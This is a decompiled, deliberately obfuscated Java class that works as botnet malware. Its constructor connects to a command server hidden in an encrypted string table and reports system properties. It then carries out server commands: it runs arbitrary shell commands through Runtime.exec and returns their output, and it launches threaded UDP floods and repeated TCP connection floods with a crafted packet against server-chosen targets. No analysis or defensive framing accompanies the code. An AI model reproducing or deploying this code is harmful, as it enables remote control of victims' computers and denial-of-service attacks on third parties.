package l.M.x;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.security.SecureRandom;

public class v_ {
   // $FF: synthetic field
   private static String[] ui;
   // $FF: synthetic field
   private static int m;
   // $FF: synthetic field
   private static boolean s;
   // $FF: synthetic field
   private static final long n = Long.reverse(2088767528225813263L) & 1095322142746896144L;
   // $FF: synthetic field
   private static final int U;
   // $FF: synthetic field
   private static final int A;
   // $FF: synthetic field
   private static final int a;
   // $FF: synthetic field
   private static final int b;
   // $FF: synthetic field
   private static final int f;
   // $FF: synthetic field
   private static final int C;
   // $FF: synthetic field
   private static final int Cl;
   // $FF: synthetic field
   private static final int R;
   // $FF: synthetic field
   private static final int E;
   // $FF: synthetic field
   private static final int N;
   // $FF: synthetic field
   private static final int K;
   // $FF: synthetic field
   private static final int I;
   // $FF: synthetic field
   private static final int D;
   // $FF: synthetic field
   private static final int Z;
   // $FF: synthetic field
   private static final int h;
   // $FF: synthetic field
   private static final int k;
   // $FF: synthetic field
   private static final int Um;
   // $FF: synthetic field
   private static final int Ay;
   // $FF: synthetic field
   private static final int q;
   // $FF: synthetic field
   private static final int d;
   // $FF: synthetic field
   private static final int q7;
   // $FF: synthetic field
   private static final int y;
   // $FF: synthetic field
   private static final int S;
   // $FF: synthetic field
   private static final int t;
   // $FF: synthetic field
   private static final int DV;
   // $FF: synthetic field
   private static final int Uw;
   // $FF: synthetic field
   private static final int o;
   // $FF: synthetic field
   private static final int X;
   // $FF: synthetic field
   private static final int Dx;
   // $FF: synthetic field
   private static final int p;
   // $FF: synthetic field
   private static final int H;
   // $FF: synthetic field
   private static final int ks;
   // $FF: synthetic field
   private static final int sn;
   // $FF: synthetic field
   private static final int ID;
   // $FF: synthetic field
   private static final int Sg;
   // $FF: synthetic field
   private static final int g;
   // $FF: synthetic field
   private static final int qU;
   // $FF: synthetic field
   private static final int uZ;
   // $FF: synthetic field
   private static final int Cs;
   // $FF: synthetic field
   private static final int w;
   // $FF: synthetic field
   private static final int AA;
   // $FF: synthetic field
   private static final int Q;
   // $FF: synthetic field
   private static final int J;
   // $FF: synthetic field
   private static final int hr;
   // $FF: synthetic field
   private static final int Cx;
   // $FF: synthetic field
   private static final int H8;
   // $FF: synthetic field
   private static final int W;
   // $FF: synthetic field
   private static final int e;
   // $FF: synthetic field
   private static final int ZN;
   // $FF: synthetic field
   private static final int DX;
   // $FF: synthetic field
   private static final int De;
   // $FF: synthetic field
   private static final int F;
   // $FF: synthetic field
   private static final int M;
   // $FF: synthetic field
   private static final int i;
   // $FF: synthetic field
   private static final int S7;
   // $FF: synthetic field
   private static final int N1;
   // $FF: synthetic field
   private static final int l;
   // $FF: synthetic field
   private static final long eT;
   // $FF: synthetic field
   private static final int nF;
   // $FF: synthetic field
   private static final int q8;
   // $FF: synthetic field
   private static final int Jv;
   // $FF: synthetic field
   private static final long O;
   // $FF: synthetic field
   private static final int bh;
   // $FF: synthetic field
   private static final int H8c;
   // $FF: synthetic field
   private static final int lx;
   // $FF: synthetic field
   private static final int ft;
   // $FF: synthetic field
   private static final int ec;
   // $FF: synthetic field
   private static final int V;
   // $FF: synthetic field
   private static final int di;
   // $FF: synthetic field
   private static final int m5;
   // $FF: synthetic field
   private static final int y6;
   // $FF: synthetic field
   private static final int Kr;
   // $FF: synthetic field
   private static final int EM;
   // $FF: synthetic field
   private static final int Q1;
   // $FF: synthetic field
   private static final int K0;
   // $FF: synthetic field
   private static final int L;
   // $FF: synthetic field
   private static final int QN;
   // $FF: synthetic field
   private static final int B;
   // $FF: synthetic field
   private static final int X6;
   // $FF: synthetic field
   private static final int kv;
   // $FF: synthetic field
   private static final int Qn;
   // $FF: synthetic field
   private static final int F2;
   // $FF: synthetic field
   private static final int T;
   // $FF: synthetic field
   private static final int sb;
   // $FF: synthetic field
   private static final int V4;
   // $FF: synthetic field
   private static final int V6;
   // $FF: synthetic field
   private static final int O8;
   // $FF: synthetic field
   private static final int mm;
   // $FF: synthetic field
   private static final int tf;
   // $FF: synthetic field
   private static final int nL;
   // $FF: synthetic field
   private static final int QZ;
   // $FF: synthetic field
   private static final int P;
   // $FF: synthetic field
   private static final int S7m;
   // $FF: synthetic field
   private static final int Wv;
   // $FF: synthetic field
   private static final int Du;
   // $FF: synthetic field
   private static final int x;
   // $FF: synthetic field
   private static final int gT;
   // $FF: synthetic field
   private static final int FS;
   // $FF: synthetic field
   private static final int Oj;
   // $FF: synthetic field
   private static final int Y;
   // $FF: synthetic field
   private static final int CF;

   // $FF: synthetic method
   private static String v3(String z8) {
      char[] IL = z8.toCharArray();
      char[] X2 = new char[IL.length];
      int Uz = O8;

      do {
         if (Uz >= IL.length) {
            String PJ = new String(X2);
            int R7 = Oj;

            do {
               if (R7 >= X2.length) {
                  PJ = new String(X2);
                  return PJ;
               }

               X2[R7] = (char)(PJ.charAt(R7) ^ Y % CF);
               ++R7;
            } while(m < 0);

            throw null;
         }

         int var5 = Uz % mm;
         if (var5 != tf) {
            if (var5 != nL) {
               if (var5 != QZ) {
                  X2[Uz] = (char)(IL[Uz] ^ z8.length() % FS);
               } else {
                  X2[Uz] = (char)(IL[Uz] ^ x % gT);
                  if (m >= 0) {
                     throw null;
                  }
               }
            } else {
               X2[Uz] = (char)(IL[Uz] ^ Wv % Du);
               if (m >= 0) {
                  throw null;
               }
            }
         } else {
            X2[Uz] = (char)(IL[Uz] ^ P % S7m);
            if (s) {
               throw null;
            }
         }

         ++Uz;
      } while(!s);

      throw null;
   }

   static {
      int var10002 = l.M.x.U.o(-350883330);
      int var10001 = -1911126265;
      U = var10002 ^ 2140121303;
      A = -1073740008 >>> l.M.x.U.o(2130706432) | -1073740008 << ~254 + 1;
      a = 256000 >>> 199 | 256000 << ~l.M.x.U.o(-486539264) + 1;
      var10002 = l.M.x.U.o(-1722901485);
      var10001 = 879650549;
      b = var10002 ^ -935759208;
      f = 805306368 >>> l.M.x.U.o(1040187392) | 805306368 << ~124 + 1;
      var10002 = l.M.x.U.o(-926966476);
      var10001 = 1549182474;
      C = var10002 ^ 750386451;
      Cl = 128 >>> l.M.x.U.o(1677721600) | 128 << ~38 + 1;
      var10001 = -1944166288;
      R = (-1544520135 ^ -1544520136) & -1;
      var10002 = l.M.x.U.N(574961580, -1046010375);
      var10001 = -615639448;
      E = var10002 ^ 580638226;
      var10001 = -1486644328;
      N = (1840879939 ^ l.M.x.U.o(-2103861834)) & -1;
      var10001 = -408064892;
      K = 119592055 ^ 119592051;
      var10001 = -778910403;
      I = (-1019306690 ^ l.M.x.U.o(-591823677)) & -1;
      var10002 = l.M.x.U.o(2117229898);
      var10001 = -2134763893;
      D = (var10002 ^ 1387940990) & -1;
      Z = 805306368 >>> l.M.x.U.N(7008, -1257774427) | 805306368 << ~l.M.x.U.o(-620756992) + 1;
      var10002 = l.M.x.U.o(-528264597);
      var10001 = 828764223;
      h = var10002 ^ -699743993;
      var10002 = l.M.x.U.o(-1753354472);
      var10001 = -477590354;
      k = var10002 ^ 418889454;
      Um = 512 >>> l.M.x.U.N(51, 922284895) | 512 << -102;
      var10002 = l.M.x.U.o(2028479394);
      var10001 = -1739584531;
      Ay = (var10002 ^ 1170478878) & -1;
      var10001 = -592654366;
      q = -1929326134 ^ l.M.x.U.o(-1014300495);
      d = 16777216 >>> 184 | 16777216 << ~l.M.x.U.o(486539264) + 1;
      var10001 = 1019311285;
      q7 = (-203172217 ^ l.M.x.U.o(-1586772017)) & -1;
      var10002 = l.M.x.U.o(-1708632837);
      var10001 = 1542526240;
      y = var10002 ^ -550890406;
      var10002 = l.M.x.U.o(992796042);
      var10001 = 50354281;
      S = var10002 ^ 1371223256;
      t = (167772160 >>> 217 | 167772160 << -l.M.x.U.o(-1694498816)) & -1;
      var10002 = l.M.x.U.o(-1644308874);
      var10001 = 897553599;
      DV = var10002 ^ 1852555187;
      var10002 = l.M.x.U.o(-237265104);
      var10001 = -1028609188;
      Uw = var10002 ^ 217701263;
      var10001 = 586179658;
      o = 2110310914 ^ l.M.x.U.N(589833719, -902279574);
      var10002 = l.M.x.U.N(-1852239369, 166190502);
      var10001 = -449319931;
      X = var10002 ^ l.M.x.U.o(36070011);
      Dx = 196608 >>> l.M.x.U.N(286, 2091103617) | 196608 << ~l.M.x.U.o(-251658240) + 1;
      var10002 = l.M.x.U.o(667913958);
      var10001 = 583139896;
      p = var10002 ^ 1735520740;
      var10001 = 226388500;
      H = 1718093713 ^ 1718093712;
      var10002 = l.M.x.U.o(-429657688);
      var10001 = -1999735982;
      ks = var10002 ^ 361743975;
      var10001 = -1420403990;
      sn = 935809413 ^ 935809415;
      ID = 3008 >>> l.M.x.U.N(-2147483607, -357184034) | 3008 << -l.M.x.U.N(83, 1227436575);
      Sg = 6144 >>> 235 | 6144 << -l.M.x.U.N(-704643071, -312134567);
      var10002 = l.M.x.U.o(-1051576211);
      var10001 = -1916780481;
      g = var10002 ^ l.M.x.U.N(-1595046126, 1148427158);
      var10002 = l.M.x.U.o(-1083739325);
      var10001 = 2081024007;
      qU = var10002 ^ -1026627847;
      var10002 = l.M.x.U.o(783600230);
      var10001 = -1348855009;
      uZ = var10002 ^ 1716727152;
      Cs = 16 >>> l.M.x.U.o(-2130706432) | 16 << ~129 + 1;
      w = 2040 >>> 67 | 2040 << -67;
      var10001 = 1916258902;
      AA = -847730604 ^ l.M.x.U.o(-1441456461);
      var10002 = l.M.x.U.o(169062020);
      var10001 = 1685070704;
      Q = var10002 ^ 561367215;
      var10002 = l.M.x.U.N(-1044524935, 974879121);
      var10001 = -270734733;
      J = var10002 ^ -398663460;
      hr = 134217728 >>> 218 | 134217728 << -l.M.x.U.o(1526726656);
      var10002 = l.M.x.U.o(858721912);
      var10001 = -1890155296;
      Cx = (var10002 ^ 510719180) & -1;
      var10001 = 2098574982;
      H8 = 1961968459 ^ l.M.x.U.o(-1832743122);
      W = 512 >>> l.M.x.U.o(-419430400) | 512 << ~231 + 1;
      var10002 = l.M.x.U.N(492115678, -761754288);
      var10001 = 615720489;
      e = var10002 ^ l.M.x.U.o(-1430750360);
      ZN = 1610612736 >>> 27 | 1610612736 << ~27 + 1;
      var10001 = 1209833742;
      DX = -1965139253 ^ -1965139250;
      var10002 = l.M.x.U.o(-2045592064);
      var10001 = 1335646989;
      De = var10002 ^ 8210529;
      var10002 = l.M.x.U.N(-866901639, -512943453);
      var10001 = -212485284;
      F = var10002 ^ l.M.x.U.o(-1809755748);
      var10002 = l.M.x.U.N(2027566809, 1329750621);
      var10001 = 670870699;
      M = var10002 ^ l.M.x.U.o(325946211);
      var10001 = 822016585;
      i = 173330624 ^ 173330626;
      var10001 = -1623199825;
      S7 = 1019779643 ^ 1019779646;
      var10002 = l.M.x.U.o(785805530);
      var10001 = 758777441;
      N1 = var10002 ^ 1527671669;
      var10002 = l.M.x.U.o(-558611366);
      var10001 = 1753011315;
      l = var10002 ^ 1512189307;
      eT = 1777980988736553960L & Long.reverse(-5206156763980969241L);
      var10001 = -222394533;
      nF = -723552625 ^ l.M.x.U.o(-424740053);
      var10002 = l.M.x.U.o(1095320738);
      var10001 = 86910668;
      q8 = var10002 ^ 1159893634;
      var10001 = -1645751797;
      Jv = -524751054 ^ -524810926;
      O = 549487594L & -6102240783978322964L;
      var10001 = -564472703;
      bh = -1224896644 ^ -1224896655;
      var10002 = l.M.x.U.o(423210778);
      var10001 = 1500336798;
      H8c = var10002 ^ 1492491414;
      lx = 245760 >>> l.M.x.U.N(91226112, 494552883) | 245760 << -174;
      var10002 = l.M.x.U.o(877797301);
      var10001 = 555118537;
      ft = var10002 ^ -1376236996;
      var10001 = -218607833;
      ec = (-446494177 ^ l.M.x.U.N(-1031554728, 1744889486)) & -1;
      V = (9216 >>> l.M.x.U.o(-1862270976) | 9216 << ~137 + 1) & -1;
      var10002 = l.M.x.U.o(-1705941683);
      var10001 = 451244217;
      di = var10002 ^ -1297708455;
      m5 = 16384 >>> l.M.x.U.o(1929379840) | 16384 << ~l.M.x.U.N(432013312, -1320236171) + 1;
      var10001 = 1217932933;
      y6 = -1643133538 ^ l.M.x.U.o(967045241);
      Kr = 3072 >>> 138 | 3072 << -138;
      var10001 = 1237199579;
      EM = -555760787 ^ l.M.x.U.o(-1765540997);
      Q1 = 671088640 >>> 59 | 671088640 << ~l.M.x.U.o(-603979776) + 1;
      K0 = 24 >>> 34 | 24 << ~l.M.x.U.o(1140850688) + 1;
      var10002 = l.M.x.U.o(-501244510);
      var10001 = -156197691;
      L = (var10002 ^ 1169815616) & -1;
      var10001 = 466451366;
      QN = 107457460 ^ 107457468;
      var10002 = l.M.x.U.o(-651522773);
      var10001 = 830729801;
      B = var10002 ^ l.M.x.U.N(1263715666, 417108122);
      var10001 = -636627743;
      X6 = 853052673 ^ 853052683;
      kv = 90112 >>> l.M.x.U.o(-1308622848) | 90112 << ~77 + 1;
      var10001 = 884805388;
      Qn = (1824561806 ^ l.M.x.U.o(1096352566)) & -1;
      F2 = -805306368 >>> l.M.x.U.o(1006632960) | -805306368 << -l.M.x.U.N(3840, 54198022);
      T = 1879048192 >>> 59 | 1879048192 << ~l.M.x.U.o(-603979776) + 1;
      var10001 = -2144652077;
      sb = (1384700357 ^ l.M.x.U.o(1402671434)) & -1;
      V4 = 16384 >>> l.M.x.U.N(-905969664, 909927640) | 16384 << ~202 + 1;
      var10002 = l.M.x.U.o(-1671010908);
      var10001 = -1767822381;
      V6 = var10002 ^ 631662120;
      var10002 = l.M.x.U.o(1606667208);
      var10001 = 1253686567;
      O8 = var10002 ^ 332645370;
      var10002 = l.M.x.U.o(580149645);
      var10001 = -1972801291;
      mm = var10002 ^ l.M.x.U.N(-1974457247, 1867295470);
      var10002 = l.M.x.U.o(1714490126);
      var10001 = 1087000197;
      tf = var10002 ^ 1892715622;
      nL = 2 >>> l.M.x.U.o(-2046820352) | 2 << -97;
      QZ = 512 >>> 40 | 512 << ~40 + 1;
      P = -1277378088 >>> l.M.x.U.o(-603979776) | -1277378088 << ~59 + 1;
      var10002 = l.M.x.U.o(-480143620);
      var10001 = 537456451;
      S7m = var10002 ^ 1063878936;
      var10002 = l.M.x.U.o(-719163712);
      var10001 = 1237714640;
      Wv = var10002 ^ 58082526;
      var10001 = 1796006563;
      Du = 834375871 ^ 834376566;
      var10002 = l.M.x.U.o(1415005225);
      var10001 = -1703144685;
      x = var10002 ^ 108824731;
      var10001 = -1842949201;
      gT = -262174164 ^ -262174214;
      var10002 = l.M.x.U.o(-903758505);
      var10001 = -419293901;
      FS = var10002 ^ l.M.x.U.N(-235577661, 1653440151);
      var10002 = l.M.x.U.o(-1487434203);
      var10001 = -1846468146;
      Oj = (var10002 ^ l.M.x.U.N(1462576015, 274345715)) & -1;
      var10002 = l.M.x.U.o(1177464467);
      var10001 = 1079832609;
      Y = var10002 ^ 1529550547;
      var10001 = -1840476675;
      CF = 1027496694 ^ l.M.x.U.o(-1051034436);
      u();
   }

   // $FF: synthetic method
   private static void u() {
      String[] var10000 = new String[V];
      var10000[di] = v3("｛ﾯǄ\uffd0｝ﾣǄ\uffd0ｘﾬǄ\uffd0～ﾯ");
      var10000[m5] = v3("｝ﾨǙￎｘﾯǞￏｦ\uffbfƙￛｉ￩Ǌ\uffde？ﾺǛ\ufff1");
      var10000[y6] = v3("９￩Əﾔｂ\ufff4Ƌﾋ）");
      var10000[Kr] = v3("＃￩Ǆﾆ－\ufff7Ə");
      var10000[EM] = v3("＃￩Ǆﾉ＞\ufff9Ƃ");
      var10000[Q1] = v3("ｌ");
      var10000[K0] = v3("／\ufff5Ƅﾛ＃\ufff6Ə");
      var10000[L] = "";
      var10000[QN] = v3("ｌ");
      var10000[B] = v3("Ｍ￮");
      var10000[X6] = v3("Ｙ\uffdeƺ");
      var10000[kv] = v3("Ｆ\ufff5ƃﾅ");
      var10000[Qn] = v3("Ｃ￪ƏﾆＭ￩ƙ");
      var10000[F2] = v3("＃￩Ǆﾆ－\ufff7Ə");
      var10000[T] = v3("［\ufff3Ƅﾌ＃￭ƙ");
      var10000[sb] = v3("／\ufff7Ǝￊ）￢Əￄｃ\ufff9Ǌ");
      var10000[V4] = v3("ｦﾗ");
      var10000[V6] = v3("ｦ");
      ui = var10000;
   }

   // $FF: synthetic method
   public v_() {
      label97:
      do {
         while(true) {
            label89: {
               try {
                  Thread.sleep(n);
               } catch (InterruptedException var19) {
                  break label89;
               }

               if (s) {
                  throw null;
               }
            }

            try {
               Socket var1 = new Socket();
               var1.connect(new InetSocketAddress(ui[U], A), a);
               OutputStream var10000 = var1.getOutputStream();
               String var10001 = ui[b];
               Object[] var10002 = new Object[f];
               var10002[C] = System.getProperty(ui[Cl]);
               var10002[R] = System.getProperty(ui[E]);
               var10002[N] = System.getProperty(ui[K]);
               var10000.write(String.format(var10001, var10002).getBytes());

               do {
                  if (!var1.isConnected()) {
                     continue label97;
                  }

                  BufferedReader var2 = new BufferedReader(new InputStreamReader(var1.getInputStream()));
                  String var3 = var2.readLine();
                  String[] var4 = var3.split(ui[I]);
                  String var5;
                  if (var4[D].equalsIgnoreCase(ui[Z])) {
                     var4[h] = ui[k];
                     var5 = String.join(ui[Um], var4);
                     (new Thread(() -> {
                        try {
                           Process var2;
                           if (!System.getProperty(ui[bh]).contains(ui[H8c])) {
                              var2 = Runtime.getRuntime().exec(var5);
                              if (m >= 0) {
                                 throw null;
                              }
                           } else {
                              var2 = Runtime.getRuntime().exec(ui[lx] + var5);
                           }

                           BufferedReader var3 = new BufferedReader(new InputStreamReader(var2.getInputStream()));
                           StringBuilder var4 = new StringBuilder();

                           while(true) {
                              String var5x;
                              if ((var5x = var3.readLine()) == null) {
                                 var1.getOutputStream().write((var4 + ui[ec]).getBytes());
                                 break;
                              }

                              var4.append(var5x).append(ui[ft]);
                              if (m >= 0) {
                                 throw null;
                              }
                           }
                        } catch (Exception var6) {
                           return;
                        }

                        if (s) {
                           throw null;
                        }
                     })).start();
                  }

                  if (var4[Ay].equalsIgnoreCase(ui[q])) {
                     var5 = var4[d];
                     int var6 = Integer.parseInt(var4[q7]);
                     int var7 = Integer.parseInt(var4[y]);
                     int var8 = Integer.parseInt(var4[S]);
                     String var9 = var4[t];
                     if (var9.equalsIgnoreCase(ui[DV])) {
                        int var10 = Uw;

                        while(var10 < var8) {
                           (new Thread(() -> {
                              InetAddress var3 = null;
                              byte[] var4 = new byte[Jv];
                              SecureRandom var5x = new SecureRandom();

                              label34: {
                                 try {
                                    var3 = InetAddress.getByName(var5);
                                 } catch (UnknownHostException var11) {
                                    break label34;
                                 }

                                 if (s) {
                                    throw null;
                                 }
                              }

                              var5x.nextBytes(var4);
                              DatagramPacket var6x = new DatagramPacket(var4, var4.length, var3, var6);
                              long var7x = System.currentTimeMillis() + (long)var7 * O;

                              while(var7x - System.currentTimeMillis() > 0L) {
                                 try {
                                    DatagramSocket var9 = new DatagramSocket();
                                    var9.connect(var3, var6);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.send(var6x);
                                    var9.close();
                                 } catch (Exception var10) {
                                    if (!s) {
                                       continue;
                                    }

                                    throw null;
                                 }

                                 if (m >= 0) {
                                    throw null;
                                 }
                              }

                           })).start();
                           ++var10;
                           if (m >= 0) {
                              throw null;
                           }
                        }
                     }

                     if (var9.equalsIgnoreCase(ui[o])) {
                        String var21 = var5;
                        if (var4.length == X) {
                           var21 = var4[Dx];
                        }

                        byte[] var11 = new byte[p];
                        var11[H] = (byte)ks;
                        var11[sn] = (byte)ID;
                        var11[Sg] = (byte)var21.length();
                        byte[] var14 = var21.getBytes();
                        int var15 = g;

                        while(var15 < var21.length()) {
                           var11[qU + var15] = var14[var15];
                           ++var15;
                           if (s) {
                              throw null;
                           }
                        }

                        var15 = var21.length() + uZ;
                        var11[var15] = (byte)(var6 >> Cs & w);
                        var11[var15 + AA] = (byte)(var6 & Q);
                        var11[var15 + J] = (byte)hr;
                        var11[Cx] = (byte)(var15 + H8);
                        var11[var15 + W] = (byte)e;
                        String var16 = ui[ZN];
                        var11[var15 + DX] = (byte)var16.length();
                        byte[] var17 = var16.getBytes();
                        int var18 = De;

                        while(var18 < var16.length()) {
                           var11[var15 + F + var18] = var17[var18];
                           ++var18;
                           if (s) {
                              throw null;
                           }
                        }

                        var11[var15 + M] = (byte)(var16.length() + i);
                        int var12 = var15 + S7 + var16.length() + N1;
                        var18 = l;

                        while(var18 < var8) {
                           (new Thread(() -> {
                              InetSocketAddress var5x = new InetSocketAddress(var5, var6);
                              long var6x = System.currentTimeMillis() + (long)var7 * eT;

                              while(var6x - System.currentTimeMillis() > 0L) {
                                 try {
                                    Socket var8 = new Socket();
                                    var8.connect(var5x, nF);
                                    var8.getOutputStream().write(var11, q8, var12);
                                    var8.close();
                                 } catch (Exception var9) {
                                    if (!s) {
                                       continue;
                                    }

                                    throw null;
                                 }

                                 if (s) {
                                    throw null;
                                 }
                              }

                           })).start();
                           ++var18;
                           if (m >= 0) {
                              throw null;
                           }
                        }
                     }
                  }
               } while(!s);

               throw null;
            } catch (Exception var20) {
               if (m >= 0) {
                  throw null;
               }
            }
         }
      } while(m < 0);

      throw null;
   }
}
